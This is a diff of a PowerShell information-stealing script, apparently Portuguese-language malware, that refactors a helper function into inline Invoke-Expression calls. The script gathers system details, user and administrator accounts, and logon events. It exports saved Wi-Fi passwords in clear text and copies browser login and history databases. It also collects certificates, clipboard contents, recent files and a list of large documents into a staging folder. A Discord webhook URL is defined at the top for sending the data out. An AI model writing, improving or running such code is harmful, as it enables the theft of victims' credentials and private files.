@@ -6,25 +6,20 @@ $hook = "https://discord.com/api/webhooks/1458595316336037923/LcenEw4uom3H_-llTp
 
 New-Item -ItemType Directory -Path $kit -Force | Out-Null
 
-function Out-Kit {
-    param($Name, $Script)
-    Invoke-Expression $Script | Out-File "$kit$Name.txt" -Encoding UTF8
-}
-
 # 1) Sistema & HW
-Out-Kit -Name "\sysinfo" -Script "systeminfo"
-Out-Kit -Name "\hw" -Script "Get-CimInstance Win32_ComputerSystem"
-Out-Kit -Name "\cpu" -Script "Get-CimInstance Win32_Processor"
-Out-Kit -Name "\bios" -Script "Get-CimInstance Win32_BIOS"
+Invoke-Expression "systeminfo" | Out-File "$kit\sysinfo.txt" -Encoding UTF8
+Invoke-Expression "Get-CimInstance Win32_ComputerSystem" | Out-File "$kit\hw.txt" -Encoding UTF8
+Invoke-Expression "Get-CimInstance Win32_Processor" | Out-File "$kit\cpu.txt" -Encoding UTF8
+Invoke-Expression "Get-CimInstance Win32_BIOS" | Out-File "$kit\bios.txt" -Encoding UTF8
 
 # 2) Rede & Wi-Fi
-Out-Kit -Name "\netip" -Script "Get-NetIPConfiguration"
+Invoke-Expression "Get-NetIPConfiguration" | Out-File "$kit\netip.txt" -Encoding UTF8
 cmd /c "netsh wlan export profile key=clear folder=$kit"
 
 # 3) Contas & privilégios
-Out-Kit -Name "\users" -Script "Get-CimInstance Win32_UserAccount"
-Out-Kit -Name "\admins" -Script "net localgroup administradores"
-Out-Kit -Name "\logons" -Script "Get-EventLog Security -InstanceId 4624 -New 200"
+Invoke-Expression "Get-CimInstance Win32_UserAccount" | Out-File "$kit\users.txt" -Encoding UTF8
+Invoke-Expression "net localgroup administradores" | Out-File "$kit\admins.txt" -Encoding UTF8
+Invoke-Expression "Get-EventLog Security -InstanceId 4624 -New 200" | Out-File "$kit\logons.txt" -Encoding UTF8
 
 # 4) Navegadores – login & histórico
 $browserPaths = @(
@@ -36,16 +31,16 @@ $browserPaths = @(
 $browserPaths | ?{ Test-Path $_ } | %{ Copy-Item $_ "$kit\$(Split-Path -Leaf $_)-$(Get-Random).db" -ErrorAction SilentlyContinue }
 
 # 5) Certificados pessoais
-Out-Kit -Name "\mycerts" -Script "Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter"
+Invoke-Expression "Get-ChildItem Cert:\CurrentUser\My | Select Subject,Thumbprint,NotAfter" | Out-File "$kit\mycerts.txt" -Encoding UTF8
 
 # 6) Clipboard atual
-Out-Kit -Name "\clipboard" -Script "Get-Clipboard"
+Invoke-Expression "Get-Clipboard" | Out-File "$kit\clipboard.txt" -Encoding UTF8
 
 # 7) Arquivos recentes
-Out-Kit -Name "\recent" -Script "Get-ChildItem '$env:APPDATA\Microsoft\Windows\Recent' | Select Name,LastWriteTime"
+Invoke-Expression "Get-ChildItem '$env:APPDATA\Microsoft\Windows\Recent' | Select Name,LastWriteTime" | Out-File "$kit\recent.txt" -Encoding UTF8
 
 # 8) Lista drives & “top 500” arquivos interessantes
-Out-Kit -Name "\drives" -Script "Get-PSDrive -PSProvider FileSystem"
+Invoke-Expression "Get-PSDrive -PSProvider FileSystem" | Out-File "$kit\drives.txt" -Encoding UTF8
 $exts = ".pdf",".doc*",".xls*",".txt",".csv",".db",".sqlite",".pst"
 Invoke-Expression "Get-ChildItem C:\ -Include $exts -Recurse -Depth 2 -ErrorAction SilentlyContinue | Select FullName,Length,LastWriteTime | Sort Length -Descending | Select -First 500 | Export-Csv '$kit\top_files.csv' -NoTypeInformation"
 
